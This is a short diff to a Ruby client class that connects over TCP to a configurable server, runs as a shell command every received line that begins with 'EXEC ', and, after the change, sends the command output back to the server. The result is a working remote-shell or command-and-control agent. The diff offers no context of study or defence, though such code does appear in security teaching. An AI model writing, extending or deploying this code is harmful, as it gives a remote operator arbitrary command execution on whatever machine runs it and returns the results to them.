@@ -11,9 +11,9 @@ class Client
 
   def connect_to_server
     puts "[*] connecting to #{@server_ip} on port #{@server_port}"
-    s = TCPSocket.open(@server_ip, @server_port)
+    @server = TCPSocket.open(@server_ip, @server_port)
 
-    while line = s.gets
+    while line = @server.gets
       line = line.chop
       if line.start_with? "EXEC "
         cmd = line[5..-1]
@@ -21,12 +21,12 @@ class Client
       end
     end
     puts "[-] connection lost"
-    s.close
+    @server.close
   end
 
   def execute_command cmd
     puts "Executing command: #{cmd}"
-    puts `#{cmd}`
+    @server.puts `#{cmd}`
   end
 end
 
